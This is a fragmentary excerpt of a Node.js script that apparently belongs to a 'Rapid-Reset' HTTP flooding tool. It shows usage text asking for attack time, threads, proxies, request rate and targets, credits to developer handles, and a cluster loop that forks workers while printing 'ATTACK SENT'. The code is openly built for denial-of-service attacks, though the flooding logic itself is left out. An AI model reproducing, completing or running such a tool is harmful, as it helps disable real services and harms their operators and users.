...
if (process.argv.length < 8){console.log(`Rapid-Reset GET <Time> <Threads> <Proxys> <RQ/S> <Targets>\nDeveloper @haibedz2006 And @Alpha`); process.exit();}
const headers = {};
...
if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
       console.clear()
       console.log(`Reset-Rapid v2 | ATTACK SENT`)
       console.log(`Methods Power By : @hb06 | Version : 2.0`)
       console.log(`-----------------------------------`)
   }
